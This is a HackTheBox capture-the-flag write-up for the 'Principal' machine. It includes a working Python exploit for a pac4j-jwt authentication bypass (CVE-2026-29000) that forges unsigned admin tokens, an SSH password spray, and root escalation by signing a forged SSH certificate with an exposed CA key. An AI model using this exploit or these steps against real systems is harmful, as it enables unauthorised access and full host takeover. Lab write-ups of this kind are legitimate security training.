---
title: "HTB: Principal"
# description: ""
date: "2026-03-15 11:33:00 +0800"
categories: [hackthebox,linux]
tags: [pac4j-jwt,CVE-2026-29000,ssh-ca,authorizedPrincipals]
pin: false
math: true
mermaid: true
image_path: assets/md_images
image:
  path: assets/md_images/principal.png

---
**Principal is a medium-difficulty box themed around misplaced cryptographic trust. The foothold exploits CVE-2026-29000, an auth bypass in pac4j-jwt where a PlainJWT inside a valid JWE envelope skips signature verification — forging an admin token to extract SSH credentials. Privesc abuses an SSH CA that trusts any signed certificate without validating the principal claim, letting you forge a root cert.**


---

## <span style="color:lightblue">Recon</span>
### <span style="color:lightgreen">Initial Scanning</span>
`nmap` finds two open TCP ports, SSH (22) and HTTP (8080). We can also
notice that the web app is powered by `pac4j-jwt/6.0.3`:

```console
$ sudo nmap -sC -sV 10.129.244.220                                                                                                                         
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-14 22:37 CDT                                                                                              
Nmap scan report for 10.129.244.220                                                                                                                          
Host is up (0.064s latency).                                                                                                                                 
Not shown: 998 closed tcp ports (reset)                                                                                                                      
PORT     STATE SERVICE    VERSION                                                                                                                            
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)                                                                     
| ssh-hostkey:                                                                                                                                               
|   256 b0:a0:ca:46:bc:c2:cd:7e:10:05:05:2a:b8:c9:48:91 (ECDSA)                                                                                              
|_  256 e8:a4:9d:bf:c1:b6:2a:37:93:40:d0:78:00:f5:5f:d9 (ED25519)                                                                                            
8080/tcp open  http-proxy Jetty                                                                                                                              
|_http-open-proxy: Proxy might be redirecting requests                                                                                                       
| http-title: Principal Internal Platform - Login                                                                                                            
|_Requested resource was /login                                                                                                                              
|_http-server-header: Jetty                                                                                                                                  
| fingerprint-strings:                                                                                                                                       
|   FourOhFourRequest:                                                                                                                                       
|     HTTP/1.1 404 Not Found                                                                                                                                 
|     Date: Sun, 15 Mar 2026 03:37:11 GMT                                                                                                                    
|     Server: Jetty                                                                                                                                          
|     X-Powered-By: pac4j-jwt/6.0.3                                                                                                                          
|     Cache-Control: must-revalidate,no-cache,no-store                                                                                                       
|     Content-Type: application/json
..snip..
```
### <span style="color:lightgreen">Look at website - http 8080</span>
The site is a login page for the Principal Internal Platform. We can see in the footer `v1.2.0 | Powered by pac4j`, which matches our previous nmap scan.

![Desktop View](assets/md_images/principal-site1.png){: .rounded-10}

Intercepting a login attempt reveals that the application submits credentials to the `/api/auth/login` endpoint.
Also, In the source code, we can find a JavaScript file at `/static/js/app.js`, which reveals several endpoints.

```javascript
/* http://10.129.244.220:8080/static/js/app.js
/**
 * Principal Internal Platform - Client Application
 * Version: 1.2.0
 *
 * Authentication flow:
 * 1. User submits credentials to /api/auth/login
 * 2. Server returns encrypted JWT (JWE) token
 * 3. Token is stored and sent as Bearer token for subsequent requests
 *
 * Token handling:
 * - Tokens are JWE-encrypted using RSA-OAEP-256 + A128GCM
 * - Public key available at /api/auth/jwks for token verification
 * - Inner JWT is signed with RS256
 *
 * JWT claims schema:
 *   sub   - username
 *   role  - one of: ROLE_ADMIN, ROLE_MANAGER, ROLE_USER
 *   iss   - "principal-platform"
 *   iat   - issued at (epoch)
 *   exp   - expiration (epoch)
 */

const API_BASE = '';
const JWKS_ENDPOINT = '/api/auth/jwks';
const AUTH_ENDPOINT = '/api/auth/login';
const DASHBOARD_ENDPOINT = '/api/dashboard';
const USERS_ENDPOINT = '/api/users';
const SETTINGS_ENDPOINT = '/api/settings';

// Role constants - must match server-side role definitions
const ROLES = {
    ADMIN: 'ROLE_ADMIN',
    MANAGER: 'ROLE_MANAGER',
    USER: 'ROLE_USER'
};
..snip..
```

If we try to visit the endpoints, the most interesting one is `/api/auth/jwks`, which contains a RSA key. Let's use `cURL` to retrieve it.
```console
$ curl -s http://10.129.244.220:8080/api/auth/jwks | jq  
{
  "keys": [
    {
      "kty": "RSA",
      "e": "AQAB",
      "kid": "enc-key-1",
      "n": "lTh54vtBS1NAWrxAFU1NEZdrVxPeSMhHZ5NpZX-WtBsdWtJRaeeG61iNgYsFUXE9j2MAqmekpnyapD6A9dfSANhSgCF60uAZhnpIkFQVKEZday6ZIxoHpuP9zh2c3a7JrknrTbCPKzX39T6IK8pydccUvRl9zT4E_i6gtoVCUKixFVHnCvBpWJtmn4h3PCPCIOXtbZHAP3Nw7ncbXXNsrO3zmWXl-GQPuXu5-Uoi6mBQbmm0Z0SC07MCEZdFwoqQFC1E6OMN2G-KRwmuf661-uP9kPSXW8l4FutRpk6-LZW5C7gwihAiWyhZLQpjReRuhnUvLbG7I_m2PV0bWWy-Fw"
    }
  ]
}
```

Searching for `pac4j-jwt/6.0.` reveals `CVE-2026-29000`, an authentication bypass involving RSA public keys. This is highly relevant, as we previously identified an RSA public key via the `/api/auth/jwks` endpoint.

## <span style="color:lightblue">Foothold</span>

### <span style="color:lightgreen">CVE-2026-29000</span>
The vulnerability in `pac4j-jwt 6.0.3` occurs when both`JWE`(encryption) and`JWS`(signature) are configured. 
1. The server receives a JWE token and decrypts it with its RSA private key.
2. The inner payload is pulled out and passed to `toSignedJWT()`.
3. If the inner payload is unsigned (`"alg":"none"`), `toSignedJWT()` returns null.
4. The code only checks the signature if the result is not null.
5. Since it is null, signature verification is skipped entirely.

The server only checks that decryption worked, but never checks the identity inside the token. This means we can **forge an admin token** and use it freely.


We will use the following script to:
1. Retrieve the RSA public key from the `/api/auth/jwks` endpoint.
2. Forge a `PlainJWT` containing administrator claims.
3. Encapsulate the forged token within a `JWE` using the server's public key.
4. Test and print the forged token.

```python
#!/usr/bin/env python3
"""CVE-2026-29000 - pac4j-jwt Authentication Bypass"""
import json, time, base64, requests, sys
from jwcrypto import jwk, jwe

TARGET = sys.argv[1]

# Step 1: Retrieve the RSA public key
resp = requests.get(f"{TARGET}/api/auth/jwks")
key_data = resp.json()['keys'][0]
pub_key = jwk.JWK(**key_data)

# Step 2: Forge PlainJWT (alg: none)
b64 = lambda d: base64.urlsafe_b64encode(d).rstrip(b'=').decode()
now = int(time.time())
header  = b64(json.dumps({"alg": "none"}).encode())
payload = b64(json.dumps({"sub": "admin", "role": "ROLE_ADMIN", "iss": "principal-platform", "iat": now, "exp": now + 3600}).encode())
plain_jwt = f"{header}.{payload}."

# Step 3: Encapsulate the forged token within a JWE using the server's public key.
jwe_token = jwe.JWE(plain_jwt.encode(), recipient=pub_key,
    protected=json.dumps({"alg": "RSA-OAEP-256", "enc": "A128GCM", "kid": key_data['kid'], "cty": "JWT"}))
forged_token = jwe_token.serialize(compact=True)

# Step 4: Test and print the forged token.
print("\n[*] Accessing /api/dashboard")
resp = requests.get(f"{TARGET}/api/dashboard", headers={"Authorization": f"Bearer {forged_token}"})
data = resp.json()
print(f"[+] Authenticated as: {data['user']['username']} ({data['user']['role']})")
print("\n[+] Add below token to the 'Session Storage' in browser under the key 'auth_token' & refresh the page.")
print(f"[+] Token: {forged_token}")
```

After saving the code to `cve-2026-29000.py`, we execute the script by providing the target URL and port:
```console
$ python3 -m venv .venv                                                                                                                                    
$ source .venv/bin/activate
$ pip3 install jwcrypto requests
$ python3 cve-2026-29000.py http://10.129.244.220:8080

[*] Accessing /api/dashboard
[+] Authenticated as: admin (ROLE_ADMIN)

[+] Add below token to the 'Session Storage' in browser under the key 'auth_token' & refresh the page.
[+] Token: eyJhbGciOiAiUlNBLU9BRVAtMjU2IiwgImVuYyI6ICJBMTI4R0NNIiwgImtpZCI6ICJlbmMta2V5LTEiLCAiY3R5IjogIkp..snip..
```

We add token to the `Session Storage` in browser under the key `auth_token`. After refreshing the page, we are logged in and brought straight to the dashboard:

![Desktop View](assets/md_images/principal-site2.png){: .w-75 .rounded-10 w='1212' h='668' }

## <span style="color:lightblue">Shell as svc-deploy</span>
Navigating to the `Users` tab reveals a list of all system users:

![Desktop View](assets/md_images/principal-site3.png){: .w-75 .rounded-10 w='1212' h='668' }

Navigating to the `Security` tab reveals a password for an encryption key:

![Desktop View](assets/md_images/principal-site4.png){: .w-75 .rounded-10 w='1212' h='668' }

With this password and the list of users, we can conduct a password spray via `SSH` to see if any user is reusing it. We'll save the usernames into a file called `users.txt` and then use `nxc` for the spray.

```console
$ cat users.txt        
admin
svc-deploy
jthompson
amorales
bwright
kkumar
mwilson
lzhang
                                                                                                                                                             
$ nxc ssh 10.129.244.220 -u users.txt -p 'D3pl0y_$$H_Now42!'
SSH         10.129.244.220  22     10.129.244.220   [*] SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.14
SSH         10.129.244.220  22     10.129.244.220   [-] admin:D3pl0y_$$H_Now42!
SSH         10.129.244.220  22     10.129.244.220   [+] svc-deploy:D3pl0y_$$H_Now42!  Linux - Shell access!
```

We can ssh in `svc-deploy` and get user flag:
```console
$ ssh svc-deploy@10.129.244.220
..snip..
svc-deploy@principal:~$ cat user.txt
c38c63d************************
```

## <span style="color:lightblue">Shell as root</span>
### <span style="color:lightgreen">Enumeration</span>
The `svc-deploy` user doesn’t have `sudo -l` privileges, nor are there any new ports running locally.

```console
svc-deploy@principal:~$ sudo -l
[sudo] password for svc-deploy: 
Sorry, user svc-deploy may not run sudo on principal.
svc-deploy@principal:~$ ss -lntp
State             Recv-Q            Send-Q                        Local Address:Port                         Peer Address:Port            Process            
LISTEN            0                 4096                          127.0.0.53%lo:53                                0.0.0.0:*                                  
LISTEN            0                 4096                                0.0.0.0:22                                0.0.0.0:*                                  
LISTEN            0                 4096                             127.0.0.54:53                                0.0.0.0:*                                  
LISTEN            0                 4096                                   [::]:22                                   [::]:*                                  
LISTEN            0                 50                                        *:8080                                    *:*    
```

Looking at the process list, we can find a process running from the `/opt/principal/` directory.
```console
svc-deploy@principal:~$ ps -ef --forest
..snip..
app         1276       1  0 02:56 ?        00:01:53 /usr/bin/java -Xmx256m -Xms128m -jar /opt/principal/app/target/principal-platform-1.2.0.jar
root        1279       1  0 02:56 ?        00:00:16 /usr/bin/containerd
root        1301       1  0 02:56 tty1     00:00:00 /sbin/agetty -o -p -- \u --noclear - linux
..snip..
```
### <span style="color:lightgreen">Insecure SSH CA Configuration - Missing AuthorizedPrincipals</span>
According to `/opt/principal/ssh/README.txt`, the sshd service is configured to trust this specific Certificate Authority (CA):
```console
svc-deploy@principal:/opt/principal/ssh$ ls
README.txt  ca  ca.pub
svc-deploy@principal:/opt/principal/ssh$ cat README.txt 
CA keypair for SSH certificate automation.

This CA is trusted by sshd for certificate-based authentication.
Use deploy.sh to issue short-lived certificates for service accounts.

Key details:
  Algorithm: RSA 4096-bit
  Created: 2025-11-15
  Purpose: Automated deployment authentication
```

While the file references `deploy.sh`, the script is unreadable with our current permissions. Consequently, we'll examine the SSHD configuration for further clues:
```console
svc-deploy@principal:/etc/ssh/sshd_config.d$ ls
50-cloud-init.conf  60-principal.conf
svc-deploy@principal:/etc/ssh/sshd_config.d$ cat 60-principal.conf 
# Principal machine SSH configuration
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin prohibit-password
TrustedUserCAKeys /opt/principal/ssh/ca.pub
```

We have identified a critical misconfiguration: `TrustedUserCAKeys` is active, but neither `AuthorizedPrincipalsFile` nor `AuthorizedPrincipalsCommand` is configured.

When OpenSSH is set up this way:
1. Any certificate signed by the trusted CA is implicitly accepted.
2. The principal listed in the certificate is verified against the target username.

Although `PermitRootLogin` is set to `prohibit-password`, certificate-based authentication remains permitted. Since we possess the CA private key, we can sign a certificate with root as the principal. This vulnerability mirrors the foothold: the system validates the cryptographic signature but allows the attacker to control the identity claim.

To escalate privileges, we will:
1. Generate a new SSH key pair.
2. Sign the public key with the CA, specifying root as the principal.
3. Authenticate via SSH as root using the forged certificate.

#### Exploit
Generate a new SSH key pair in the `/tmp` directory. When prompted, press Enter to accept the default settings (no passphrase):
```console
svc-deploy@principal:/tmp$ ssh-keygen -t ed25519 -f /tmp/woot
Generating public/private ed25519 key pair.
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /tmp/woot
Your public key has been saved in /tmp/woot.pub
```

Referring to the `ssh-keygen` help menu, we can identify the parameters needed to sign the public key and assign the `root` principal:
```
svc-deploy@principal:/tmp$ ssh-keygen --help
..snip..
ssh-keygen -I certificate_identity -s ca_key [-hU] [-D pkcs11_provider]
           [-n principals] [-O option] [-V validity_interval]
           [-z serial_number] file ...

svc-deploy@principal:/tmp$ ssh-keygen -s /opt/principal/ssh/ca -I DoesNotMatter -n root -V +1h /tmp/woot.pub
Signed user key /tmp/woot-cert.pub: id "DoesNotMatter" serial 0 for root valid from 2026-03-15T07:06:00 to 2026-03-15T08:07:14
```

We authenticate via SSH as `root` using the forged certificate. Once logged in, we can retrieve the root flag from the `/root` directory:

```console
svc-deploy@principal:/tmp$ ssh -i /tmp/woot root@127.0.0.1
The authenticity of host '127.0.0.1 (127.0.0.1)' can't be established.
ED25519 key fingerprint is SHA256:ibvdsZXiwJ6QUMPTxoH3spRA8hV9mbd98MLpLt3XG/E.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:1: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
..snip..
root@principal:~# ls
root.txt
root@principal:~# cat root.txt
dfb15a************************
```
